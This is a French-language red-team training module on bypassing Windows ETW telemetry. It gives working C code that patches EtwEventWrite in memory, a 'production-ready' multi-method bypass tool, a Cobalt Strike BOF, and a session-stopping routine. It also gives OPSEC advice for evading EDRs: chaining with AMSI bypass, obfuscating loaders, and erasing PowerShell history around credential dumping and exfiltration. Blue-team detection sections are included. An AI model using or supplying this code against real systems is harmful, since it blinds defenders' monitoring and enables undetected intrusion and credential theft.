# Module W37 : ETW (Event Tracing for Windows) Bypass

## Objectifs du Module

À la fin de ce module, vous serez capable de :

- ✅ Comprendre l'architecture et le fonctionnement d'ETW
- ✅ Identifier les providers ETW critiques pour la sécurité
- ✅ Implémenter différentes techniques de bypass ETW
- ✅ Patcher `EtwEventWrite` en mémoire
- ✅ Manipuler les structures internes d'ETW
- ✅ Évaluer l'impact OPSEC de chaque technique
- ✅ Détecter les traces laissées par les bypasses ETW

---

## 1. Introduction à ETW

### 1.1 Qu'est-ce qu'ETW ?

**ETW** (Event Tracing for Windows) est un mécanisme de traçage et de télémétrie intégré à Windows depuis Windows 2000. C'est essentiellement un système de logging ultra-performant utilisé par :

- Le système d'exploitation Windows lui-même
- Les applications Microsoft (.NET, PowerShell, etc.)
- Les solutions EDR/AV pour détecter les comportements malveillants
- Les outils de diagnostic et de monitoring

**Analogie** : Imaginez ETW comme un système de caméras de surveillance dans un bâtiment. Les "caméras" (Providers) enregistrent tout ce qui se passe, les "centrales" (Sessions) collectent les vidéos, et les "agents de sécurité" (Consumers = EDR) les analysent pour détecter les intrusions.

### 1.2 Pourquoi ETW est-il crucial pour les EDRs ?

ETW permet aux EDRs de voir en temps réel :

- **Chargement de .NET** : Assembly loading, JIT compilation
- **Exécution PowerShell** : Commandes, scripts, code déobfusqué
- **Appels système** : Injection de code, manipulation de processus
- **Activité réseau** : Connexions, DNS, etc.

**Exemple concret** : Quand vous exécutez `Invoke-Mimikatz` en PowerShell, même si le script est obfusqué, ETW capture le code APRÈS déobfuscation grâce au provider `Microsoft-Windows-PowerShell`.

### 1.3 Pourquoi bypasser ETW ?

En tant qu'attaquant (Red Team), ETW est votre ennemi car :

- Il expose vos actions même si vous utilisez des techniques in-memory
- Il capture le code après déobfuscation
- Il est utilisé par la majorité des EDRs modernes (CrowdStrike, SentinelOne, Defender ATP, etc.)

**Bypasser ETW = Aveugler les "caméras de surveillance" de l'EDR**

---

## 2. Architecture ETW : Comment ça Fonctionne

### 2.1 Les 3 Composants Principaux

ETW repose sur une architecture en 3 couches :

```ascii
┌─────────────────────────────────────────────────────────────┐
│                    1. PROVIDERS                             │
│  (Génèrent les événements - "Caméras de surveillance")      │
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
│  │  PowerShell  │  │    .NET      │  │   Kernel     │     │
│  │   Provider   │  │   Provider   │  │   Provider   │     │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘     │
│         │                  │                  │             │
└─────────┼──────────────────┼──────────────────┼─────────────┘
          │                  │                  │
          ▼                  ▼                  ▼
┌─────────────────────────────────────────────────────────────┐
│                    2. SESSIONS                               │
│  (Collectent et routent les événements - "Centrales")       │
│                                                              │
│  ┌──────────────────────────────────────────────────┐      │
│  │      ETW Session (ex: "EventLog-System")         │      │
│  └──────────────────┬───────────────────────────────┘      │
└─────────────────────┼───────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│                    3. CONSUMERS                              │
│  (Analysent les événements - "Agents de sécurité")          │
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
│  │     EDR      │  │  Event Log   │  │   SysInternals│     │
│  │  (Defender)  │  │   Viewer     │  │    Tools     │     │
│  └──────────────┘  └──────────────┘  └──────────────┘     │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 Flux de Données ETW

Voici comment un événement ETW circule :

```ascii
1. Application exécute du code
      │
      ▼
2. Provider ETW génère un événement
   (ex: "Assembly X.dll chargé en mémoire")
      │
      ▼
3. Event Dispatcher (ntdll!EtwEventWrite)
   Route l'événement vers les sessions actives
      │
      ▼
4. ETW Session stocke l'événement
   (en mémoire ou fichier .etl)
      │
      ▼
5. Consumer (EDR) consomme et analyse
   → Détection de comportement malveillant !
```

### 2.3 Point Critique : `EtwEventWrite`

**Toutes** les données ETW passent par la fonction `EtwEventWrite` dans `ntdll.dll`. C'est le goulot d'étranglement du système ETW.

```ascii
┌────────────────────────────────────────────┐
│         Application User Mode              │
│                                             │
│  Provider.Write("Event data...")           │
│              │                              │
│              ▼                              │
│  ┌────────────────────────────────┐        │
│  │  ntdll.dll!EtwEventWrite       │◄────── CIBLE DU PATCH
│  │  (Point de passage unique)     │        │
│  └────────────┬───────────────────┘        │
└───────────────┼─────────────────────────────┘
                │
                ▼
      ┌─────────────────┐
      │  Kernel Mode    │
      │  ETW Subsystem  │
      └─────────────────┘
```

**Idée clé** : Si on désactive `EtwEventWrite`, tous les providers deviennent muets !

---

## 3. Providers ETW Critiques

### 3.1 Providers Importants pour la Sécurité

| Provider GUID | Nom | Ce qu'il trace | Impact Red Team |
|---------------|-----|----------------|-----------------|
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | Microsoft-Windows-DotNETRuntime | Chargement assemblies .NET, JIT | **CRITIQUE** - Expose execute-assembly, BOF .NET |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Windows-PowerShell | Scripts PowerShell déobfusqués | **CRITIQUE** - Expose Invoke-Mimikatz, etc. |
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Antimalware-Scan-Interface | AMSI events | **ÉLEVÉ** - Corrélé avec AMSI bypass |
| `{9E814AAD-3204-11D2-9A82-006008C7B8F0}` | Microsoft-Windows-Kernel-Process | Création processus, threads | **MOYEN** - Détecte injection |
| `{06184C97-5201-480E-92AF-3A3626C5B140}` | Microsoft-Windows-Services | Services Windows | **FAIBLE** - Persistance via services |

### 3.2 Exemple : Provider .NET Runtime

Quand vous exécutez un assembly .NET (execute-assembly dans Cobalt Strike), le provider .NET capture :

```ascii
EVENT 1: Assembly Load Started
  - AssemblyName: "Rubeus"
  - Path: "Memory"  ← Suspect !
  - LoadContext: "Default"

EVENT 2: JIT Compilation Started
  - Method: "Rubeus.Program.Main"
  - IL Code Size: 4523 bytes

EVENT 3: Assembly Loaded
  - AssemblyID: 0x12345678
  - Flags: InMemory | Dynamic  ← RED FLAG pour EDR
```

**Résultat** : L'EDR voit que vous chargez un assembly en mémoire et peut extraire le code pour analyse statique.

---

## 4. Techniques de Bypass ETW

### 4.1 Technique #1 : Patching `EtwEventWrite` (Classique)

#### Principe

Modifier le début de la fonction `EtwEventWrite` en mémoire pour qu'elle retourne immédiatement sans rien faire.

#### Code x64

```c
#include <windows.h>
#include <stdio.h>

BOOL PatchETW() {
    // 1. Récupérer l'adresse de ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] GetModuleHandle(ntdll) failed: %d\n", GetLastError());
        return FALSE;
    }

    // 2. Récupérer l'adresse de EtwEventWrite
    LPVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] GetProcAddress(EtwEventWrite) failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] EtwEventWrite located at: 0x%p\n", pEtwEventWrite);

    // 3. Définir le patch (ret = return immédiat)
    // x64: 0xC3 = ret
    BYTE patch[] = { 0xC3 };

    DWORD oldProtect;
    SIZE_T bytesWritten;

    // 4. Changer les permissions de la page mémoire
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    // 5. Écrire le patch
    if (!WriteProcessMemory(GetCurrentProcess(), pEtwEventWrite, patch, sizeof(patch), &bytesWritten)) {
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        return FALSE;
    }

    // 6. Restaurer les permissions d'origine
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] ETW successfully patched!\n");
    return TRUE;
}

int main() {
    printf("[*] Attempting to bypass ETW...\n");

    if (PatchETW()) {
        printf("[+] ETW is now blind!\n");
        printf("[*] You can now execute malicious .NET/PowerShell code safely\n");
    } else {
        printf("[-] Failed to bypass ETW\n");
    }

    return 0;
}
```

#### Diagramme Avant/Après

```ascii
AVANT PATCH :
┌──────────────────────────────────────┐
│ EtwEventWrite (ntdll.dll)            │
│ Adresse: 0x00007FF912340000          │
├──────────────────────────────────────┤
│ 0x00: 4C 8B DC        mov r11, rsp  │ ← Prologue normal
│ 0x03: 48 83 EC 58     sub rsp, 58h  │
│ 0x07: 48 8B 05 ...    mov rax, ... │
│ 0x0E: ...             ...           │
│       [Code légitime ETW]            │
└──────────────────────────────────────┘
                │
                ▼
     Événements envoyés à l'EDR ✓


APRÈS PATCH :
┌──────────────────────────────────────┐
│ EtwEventWrite (ntdll.dll)            │
│ Adresse: 0x00007FF912340000          │
├──────────────────────────────────────┤
│ 0x00: C3              ret            │ ◄── PATCHÉ ! Retour immédiat
│ 0x01: 83 EC 58        sub rsp, 58h  │ ◄── Jamais exécuté
│ 0x04: 48 8B 05 ...    mov rax, ... │
│       [Code jamais atteint]          │
└──────────────────────────────────────┘
                │
                ▼
     Événements JAMAIS envoyés ✗
```

#### Variante : Patch Multi-Bytes (Plus Discret)

Au lieu de `ret`, on peut utiliser un NOP sled + ret pour être moins évident :

```c
// Patch x64 : xor eax, eax (met 0 dans eax) puis ret
BYTE patch[] = {
    0x33, 0xC0,  // xor eax, eax  (STATUS_SUCCESS)
    0xC3         // ret
};
```

### 4.2 Technique #2 : Modification des Descriptors ETW

#### Principe

Chaque provider ETW a une structure en mémoire appelée `EVENT_DESCRIPTOR`. On peut modifier les flags pour désactiver le logging sans toucher à `EtwEventWrite`.

#### Structures Internes (Documentation non officielle)

```c
// Structure simplifiée d'un Provider ETW
typedef struct _ETW_PROVIDER_METADATA {
    GUID ProviderGuid;
    ULONG EnableFlags;         // ← Si = 0, provider désactivé
    UCHAR Level;               // Niveau de logging (Error, Warning, etc.)
    ULONGLONG MatchAnyKeyword;
    ULONGLONG MatchAllKeyword;
    // ... autres champs
} ETW_PROVIDER_METADATA;
```

#### Code Conceptuel (Nécessite Reverse Engineering)

```c
// ATTENTION : Code conceptuel, les offsets varient selon la version de Windows
BOOL DisableETWProvider(GUID* providerGuid) {
    // 1. Trouver la structure du provider en mémoire
    //    (nécessite du pattern scanning ou hooking)

    // 2. Localiser le champ EnableFlags
    PULONG pEnableFlags = FindProviderEnableFlags(providerGuid);

    if (!pEnableFlags) {
        return FALSE;
    }

    // 3. Désactiver le provider
    DWORD oldProtect;
    VirtualProtect(pEnableFlags, sizeof(ULONG), PAGE_READWRITE, &oldProtect);
    *pEnableFlags = 0;  // Désactive tous les events
    VirtualProtect(pEnableFlags, sizeof(ULONG), oldProtect, &oldProtect);

    return TRUE;
}
```

**Avantage** : Plus ciblé, ne touche qu'un provider spécifique.
**Inconvénient** : Nécessite de connaître les offsets internes (version-dependent).

### 4.3 Technique #3 : Désactivation via `NtTraceControl`

#### Principe

Utiliser l'API non documentée `NtTraceControl` pour arrêter une session ETW active.

#### Code

```c
#include <windows.h>
#include <evntrace.h>

typedef NTSTATUS (NTAPI *pNtTraceControl)(
    ULONG FunctionCode,
    PVOID InBuffer,
    ULONG InBufferLen,
    PVOID OutBuffer,
    ULONG OutBufferLen,
    PULONG ReturnLength
);

BOOL StopETWSession(const wchar_t* sessionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtTraceControl NtTraceControl = (pNtTraceControl)GetProcAddress(hNtdll, "NtTraceControl");

    if (!NtTraceControl) {
        return FALSE;
    }

    // TRACE_CONTROL_STOP = 1
    EVENT_TRACE_PROPERTIES props = {0};
    props.Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + (wcslen(sessionName) + 1) * sizeof(wchar_t);
    props.Wnode.Guid = /* GUID de la session */;
    props.Wnode.Flags = WNODE_FLAG_TRACED_GUID;

    ULONG returnLength;
    NTSTATUS status = NtTraceControl(
        1,  // TraceControlStop
        &props,
        props.Wnode.BufferSize,
        &props,
        props.Wnode.BufferSize,
        &returnLength
    );

    return (status == 0);
}
```

**Limite** : Nécessite des privilèges élevés et peut être détecté (arrêt anormal de session).

### 4.4 Technique #4 : Hooking `EtwEventWrite` (Avancé)

Au lieu de patcher brutalement, on peut installer un hook pour filtrer sélectivement les événements.

```c
// Hook inline avec détour
typedef NTSTATUS (NTAPI *pEtwEventWrite)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
);

pEtwEventWrite OriginalEtwEventWrite = NULL;

NTSTATUS NTAPI HookedEtwEventWrite(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
) {
    // Filtrer seulement les événements sensibles
    if (EventDescriptor->Id == 10 || EventDescriptor->Id == 2006) {
        // Événements .NET Assembly Load - BLOQUER
        return 0; // STATUS_SUCCESS sans rien faire
    }

    // Laisser passer les autres événements (moins suspect)
    return OriginalEtwEventWrite(RegHandle, EventDescriptor, UserDataCount, UserData);
}

// Installation du hook avec MinHook, Detours, etc.
```

**Avantage** : Sélectif, moins bruyant.
**Inconvénient** : Plus complexe à implémenter.

---

## 5. Code Complet : ETW Bypass Multi-Techniques

### 5.1 Code Production-Ready

```c
#include <windows.h>
#include <stdio.h>

// ============================================================================
// TECHNIQUE 1 : Patch EtwEventWrite
// ============================================================================

BOOL PatchETW_Method1() {
    printf("[*] Method 1: Patching EtwEventWrite...\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] Failed to locate EtwEventWrite\n");
        return FALSE;
    }

    printf("[+] EtwEventWrite @ 0x%p\n", pEtwEventWrite);

    // Patch: xor eax, eax + ret (plus discret que juste ret)
    BYTE patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret

    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwEventWrite, patch, sizeof(patch));

    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] ETW patched successfully!\n");
    return TRUE;
}

// ============================================================================
// TECHNIQUE 2 : Utilisation de NtProtectVirtualMemory (syscall direct)
// ============================================================================

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

BOOL PatchETW_Method2_Syscall() {
    printf("[*] Method 2: Direct syscall variant...\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

    pNtProtectVirtualMemory NtProtectVirtualMemory =
        (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    if (!pEtwEventWrite || !NtProtectVirtualMemory) {
        return FALSE;
    }

    PVOID baseAddr = pEtwEventWrite;
    SIZE_T regionSize = 3;
    ULONG oldProtect;

    // Changer protection via syscall
    NTSTATUS status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &baseAddr,
        &regionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );

    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
        return FALSE;
    }

    // Patch
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    memcpy(pEtwEventWrite, patch, sizeof(patch));

    // Restaurer
    NtProtectVirtualMemory(
        GetCurrentProcess(),
        &baseAddr,
        &regionSize,
        oldProtect,
        &oldProtect
    );

    printf("[+] ETW patched via syscall!\n");
    return TRUE;
}

// ============================================================================
// HELPER : Vérifier si ETW est actif
// ============================================================================

BOOL IsETWActive() {
    // Méthode simple : vérifier si EtwEventWrite commence par un prologue normal
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE pEtwEventWrite = (PBYTE)GetProcAddress(hNtdll, "EtwEventWrite");

    if (!pEtwEventWrite) {
        return FALSE;
    }

    // Si le premier octet est 0xC3 (ret), ETW est patché
    if (pEtwEventWrite[0] == 0xC3) {
        return FALSE; // Déjà patché
    }

    return TRUE; // Actif
}

// ============================================================================
// MAIN
// ============================================================================

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("  ETW Bypass Multi-Method\n");
    printf("========================================\n\n");

    // Vérifier l'état initial
    if (IsETWActive()) {
        printf("[!] ETW is currently ACTIVE\n");
    } else {
        printf("[!] ETW is already DISABLED\n");
        return 0;
    }

    // Choix de la méthode
    int method = 1;
    if (argc > 1) {
        method = atoi(argv[1]);
    }

    BOOL success = FALSE;
    switch (method) {
        case 1:
            success = PatchETW_Method1();
            break;
        case 2:
            success = PatchETW_Method2_Syscall();
            break;
        default:
            printf("[-] Invalid method. Use 1 or 2.\n");
            return 1;
    }

    if (success) {
        printf("\n[+] ETW bypass successful!\n");
        printf("[+] .NET and PowerShell telemetry disabled\n");

        // Vérifier
        if (!IsETWActive()) {
            printf("[+] Verification: ETW is now DISABLED\n");
        }
    } else {
        printf("\n[-] ETW bypass failed!\n");
    }

    return success ? 0 : 1;
}
```

### 5.2 Compilation

```bash
# Windows x64
cl.exe /O2 etw_bypass.c

# MinGW
x86_64-w64-mingw32-gcc etw_bypass.c -o etw_bypass.exe -s
```

---

## 6. Impact sur les EDRs

### 6.1 EDRs Affectés par ETW Bypass

| EDR | Provider ETW Utilisé | Impact du Bypass | Détection |
|-----|---------------------|------------------|-----------|
| **Windows Defender ATP** | .NET Runtime, PowerShell, AMSI | ✅ Critique - Perd visibilité sur .NET/PS | Medium |
| **CrowdStrike Falcon** | .NET Runtime, Kernel-Process | ✅ Élevé - Réduit détection execute-assembly | Élevée |
| **SentinelOne** | Multiples providers | ✅ Moyen - Compensation par d'autres sources | Élevée |
| **Carbon Black** | PowerShell, .NET | ✅ Élevé - Dépendance forte ETW | Medium |
| **Elastic EDR** | Custom providers + standards | ⚠️ Faible - Moins dépendant ETW | Faible |

### 6.2 Ce que l'EDR Voit (ou ne voit plus)

#### AVANT Bypass ETW

```ascii
Timeline de l'EDR :
─────────────────────────────────────────────────────────
14:23:45 | Process Created: powershell.exe (PID 4521)
14:23:45 | ETW: PowerShell script block logged
         | Content: "IEX (New-Object Net.WebClient).Download..."
14:23:46 | ETW: Assembly load event
         | Assembly: Rubeus.dll (Memory-based) ◄── RED FLAG
14:23:46 | ETW: JIT compilation started
14:23:47 | AMSI: Malicious script detected ◄── AMSI catch
14:23:47 | ACTION: Process blocked
─────────────────────────────────────────────────────────
        RÉSULTAT : DÉTECTION + BLOCAGE
```

#### APRÈS Bypass ETW

```ascii
Timeline de l'EDR :
─────────────────────────────────────────────────────────
14:23:45 | Process Created: powershell.exe (PID 4521)
14:23:45 | ETW: [SILENCE RADIO - Aucun événement] ◄── ETW mort
14:23:46 | [Aucune donnée]
14:23:47 | [Aucune donnée]
─────────────────────────────────────────────────────────
        RÉSULTAT : EDR AVEUGLE (sauf si hooks kernel)
```

### 6.3 Combinaison ETW + AMSI Bypass

Pour un bypass complet des défenses .NET/PowerShell :

```c
// 1. Bypass AMSI
PatchAMSI();  // Voir module W36

// 2. Bypass ETW
PatchETW();

// Maintenant : exécution de code malveillant .NET/PowerShell
// sans détection par Defender/EDR
```

---

## 7. Détection et OPSEC

### 7.1 Comment les Blue Teams Détectent le Bypass ETW

#### Méthode 1 : Détection de Modification de `ntdll.dll`

Les EDRs peuvent vérifier l'intégrité de `ntdll.dll` :

```c
// Code Blue Team (simplifié)
BOOL DetectNtdllPatching() {
    // 1. Charger ntdll.dll depuis le disque (version "propre")
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
    PVOID cleanNtdll = MapViewOfFile(...);

    // 2. Comparer avec ntdll en mémoire
    HMODULE hNtdllMemory = GetModuleHandleA("ntdll.dll");
    PBYTE pEtwEventWrite = GetProcAddress(hNtdllMemory, "EtwEventWrite");

    // 3. Comparer les 16 premiers bytes
    if (memcmp(pEtwEventWrite, cleanNtdll + offsetEtwEventWrite, 16) != 0) {
        // ALERTE : ntdll.dll a été modifié !
        return TRUE;
    }

    return FALSE;
}
```

#### Méthode 2 : Détection de Silence Radio ETW

```ascii
Heuristique EDR :
─────────────────────────────────────────────────
IF (Process = powershell.exe || Process loads .NET)
   AND (Aucun événement ETW .NET/PowerShell depuis 5s)
   AND (Process toujours actif)
THEN
   ALERTE : "Possible ETW bypass"
─────────────────────────────────────────────────
```

#### Méthode 3 : Hooking Kernel-Mode

Les EDRs avec drivers kernel peuvent hooker au niveau kernel :

```ascii
User Mode                    Kernel Mode
─────────────────────────    ─────────────────────────
Application
    │
    ▼
EtwEventWrite (PATCHÉ)
    │ [bloqué]
    ✗
                             ▼
                       ETW Kernel Dispatch ◄── EDR hook ici
                             │
                             ▼
                       Event Consumers
```

**Résultat** : Même si on patch en user-mode, le hook kernel capture quand même.

### 7.2 Bonnes Pratiques OPSEC

#### DO ✅

1. **Patcher AVANT toute action malveillante**
   ```c
   PatchETW();
   Sleep(2000); // Attendre que l'EDR stabilise
   ExecuteMaliciousCode();
   ```

2. **Combiner avec d'autres bypasses**
   ```c
   PatchAMSI();
   PatchETW();
   UnhookEDR();  // Unhooking ntdll
   ```

3. **Utiliser un loader obfusqué**
   - Charger le patch depuis un shellcode chiffré
   - Éviter les strings "EtwEventWrite" en clair

4. **Restaurer après usage (optionnel)**
   ```c
   // Sauvegarder les bytes originaux
   BYTE originalBytes[16];
   memcpy(originalBytes, pEtwEventWrite, 16);

   // Patcher
   PatchETW();

   // Exécuter payload
   RunPayload();

   // Restaurer (moins suspect à long terme)
   RestoreOriginalBytes(pEtwEventWrite, originalBytes, 16);
   ```

#### DON'T ❌

1. **Ne PAS patcher puis laisser le processus tourner longtemps**
   - Plus le processus vit, plus la détection est probable

2. **Ne PAS utiliser `VirtualProtect` en boucle**
   - Génère beaucoup d'événements kernel

3. **Ne PAS ignorer les autres télémétries**
   - Même sans ETW, l'EDR peut voir via :
     - Hooks IAT/EAT
     - Minifilter drivers (filesystem)
     - Network monitoring
     - Memory scanning

4. **Ne PAS patcher depuis PowerShell direct**
   ```powershell
   # MAUVAIS : Très bruyant
   [Reflection.Assembly]::Load([byte[]]$patchCode)
   ```

### 7.3 Timeline d'une Attaque avec ETW Bypass

```ascii
T+0s  : Exécution initiale (beacon, implant)
        ├─ EDR voit : Process created
        └─ ETW : Actif

T+2s  : Bypass ETW
        ├─ EDR voit : VirtualProtect sur ntdll (suspect mais pas bloquant)
        └─ ETW : Désactivé ✗

T+5s  : Chargement Rubeus.exe en mémoire (execute-assembly)
        ├─ EDR voit : Rien (ETW mort)
        └─ Potentiel : Hook kernel peut encore voir

T+10s : Dump LSASS credentials
        ├─ EDR voit : OpenProcess(lsass.exe) ◄── Détectable !
        └─ Autres défenses : PPL, Credential Guard

T+30s : Exfiltration
        ├─ EDR voit : Connexion réseau inhabituelle
        └─ Network monitoring indépendant d'ETW
```

**Conclusion** : ETW bypass n'est PAS une silver bullet, mais réduit significativement la visibilité.

---

## 8. Contre-Mesures (Perspective Blue Team)

### 8.1 Détection : Sysmon Event ID 8 (CreateRemoteThread)

Bien que non ETW, Sysmon peut détecter :

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <ProcessAccess onmatch="include">
      <TargetImage condition="end with">ntdll.dll</TargetImage>
      <GrantedAccess>0x1FFFFF</GrantetAccess> <!-- Full access suspect -->
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
```

### 8.2 Détection : Monitoring Kernel Callbacks

```c
// Driver EDR (kernel mode)
VOID MonitorImageLoad(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo) {
    if (wcsstr(FullImageName->Buffer, L"ntdll.dll")) {
        // Vérifier l'intégrité après chargement
        PVOID etwEventWrite = FindExportedFunction(ImageInfo->ImageBase, "EtwEventWrite");

        if (IsPatched(etwEventWrite)) {
            // ALERTE : ETW bypass détecté !
            LogAlert(ProcessId, "ETW_BYPASS_DETECTED");
            TerminateProcess(ProcessId);  // Action agressive
        }
    }
}

PsSetLoadImageNotifyRoutine(MonitorImageLoad);
```

### 8.3 Mitigation : Protected Processes

Windows peut protéger certains processus (PPL - Protected Process Light) :

```c
// Démarrer PowerShell en mode protégé (nécessite signature)
// ETW devient alors impossible à patcher sans privilèges kernel
```

### 8.4 Détection : Anomalies de Comportement

```ascii
Règle de détection comportementale :
─────────────────────────────────────────────────────────
SI (Processus charge .NET Runtime)
   ET (Aucun événement ETW .NET pendant > 10 secondes)
   ET (Activité réseau détectée)
ALORS
   Score de risque += 50
   Tag : "Possible ETW Bypass"
─────────────────────────────────────────────────────────
```

---

## 9. Outils et Ressources

### 9.1 Outils Automatisés

| Outil | Description | Lien |
|-------|-------------|------|
| **SilentTrinity** | C2 avec ETW bypass intégré | GitHub |
| **Donut** | Shellcode generator avec option ETW patch | GitHub |
| **InlineExecute-Assembly** | BOF Cobalt Strike avec ETW bypass | GitHub |
| **EtwBypass.ps1** | PowerShell script pour bypass | Various |

### 9.2 Exemple : Integration avec Cobalt Strike

```c
// BOF (Beacon Object File) pour Cobalt Strike
#include "beacon.h"

void go(char* args, int len) {
    // Patcher ETW
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWrite = KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD oldProtect;

    KERNEL32$VirtualProtect(pEtwEventWrite, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    MSVCRT$memcpy(pEtwEventWrite, patch, 3);
    KERNEL32$VirtualProtect(pEtwEventWrite, 3, oldProtect, &oldProtect);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW bypassed");
}
```

### 9.3 Ressources Externes

- **MDSec Blog** : "Hiding your .NET - ETW" (2020)
- **SpecterOps Blog** : "Bypassing ETW for Fun and Profit"
- **Microsoft Docs** : Event Tracing (Official)
- **Windows Internals Part 1** : Chapitre sur ETW (livre)

---

## 10. Checklist de Mise en Œuvre

### Phase 1 : Préparation

- [ ] Identifier les providers ETW actifs sur la cible
  ```bash
  logman query providers | findstr "Microsoft-Windows"
  ```
- [ ] Vérifier la version de Windows (offsets peuvent varier)
- [ ] Tester le bypass dans un lab avant production
- [ ] Préparer un plan de rollback

### Phase 2 : Exécution

- [ ] Obtenir un premier accès (shell initial)
- [ ] Vérifier les privilèges (pas besoin d'admin pour ETW bypass)
- [ ] Patcher ETW via la technique choisie
- [ ] Vérifier que le patch a fonctionné
  ```c
  if (!IsETWActive()) {
      printf("Success!\n");
  }
  ```
- [ ] Attendre 2-5 secondes avant actions malveillantes
- [ ] Exécuter le payload principal (.NET, PowerShell, etc.)

### Phase 3 : Nettoyage (Optionnel)

- [ ] Restaurer les bytes originaux de `EtwEventWrite`
- [ ] Supprimer les artifacts en mémoire
- [ ] Effacer les logs PowerShell si applicable
  ```powershell
  Remove-Item (Get-PSReadlineOption).HistorySavePath
  ```

### Phase 4 : Post-Exploitation

- [ ] Monitorer si l'EDR réagit (alerte, blocage)
- [ ] Si détection → migrer vers un autre processus
- [ ] Documenter ce qui a fonctionné/échoué

---

## 11. Exercices Pratiques

### Exercice 1 : Bypass ETW Basique (Débutant)

**Objectif** : Implémenter le patch `ret` sur `EtwEventWrite`

**Consignes** :
1. Créer un programme C qui localise `EtwEventWrite`
2. Afficher son adresse
3. Patcher les 3 premiers bytes avec `{ 0x33, 0xC0, 0xC3 }`
4. Vérifier le patch en lisant la mémoire

**Validation** :
```c
PBYTE p = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
assert(p[0] == 0x33 && p[1] == 0xC0 && p[2] == 0xC3);
```

### Exercice 2 : Détection de Patch ETW (Intermédiaire)

**Objectif** : Créer un outil Blue Team qui détecte le bypass ETW

**Consignes** :
1. Charger `ntdll.dll` depuis le disque (version propre)
2. Comparer avec `ntdll.dll` en mémoire du processus
3. Détecter les modifications de `EtwEventWrite`

**Bonus** : Calculer un hash SHA256 de la fonction originale vs patchée

### Exercice 3 : ETW Bypass + Execute-Assembly (Avancé)

**Objectif** : Charger un assembly .NET (Rubeus) sans détection ETW

**Consignes** :
1. Patcher ETW
2. Charger `System.Reflection.Assembly` via C/C++
3. Invoquer `Assembly.Load()` avec un assembly .NET
4. Vérifier qu'aucun événement ETW n'est généré

**Outils nécessaires** : Visual Studio, Process Monitor (ProcMon)

### Exercice 4 : Bypass Persistant (Expert)

**Objectif** : Maintenir le bypass ETW même après un rechargement de `ntdll.dll`

**Consignes** :
1. Hooker `LdrLoadDll` pour détecter le chargement de DLLs
2. Quand `ntdll.dll` est rechargé, re-patcher automatiquement
3. Tester avec un processus qui décharge/recharge explicitement ntdll

---

## 12. Questions Fréquentes (FAQ)

### Q1 : Le bypass ETW nécessite-t-il des privilèges admin ?

**R** : Non ! C'est l'un des avantages majeurs. Vous modifiez la mémoire de VOTRE processus, donc pas besoin de privilèges élevés. Contrairement au unhooking de drivers EDR (kernel), ETW bypass fonctionne en user-mode.

### Q2 : Le bypass ETW fonctionne-t-il sur Windows 11 ?

**R** : Oui, mais Microsoft renforce progressivement les protections :
- Windows 11 22H2+ : Integrity checks plus fréquentes
- Certains processus "protégés" ne peuvent plus être patchés
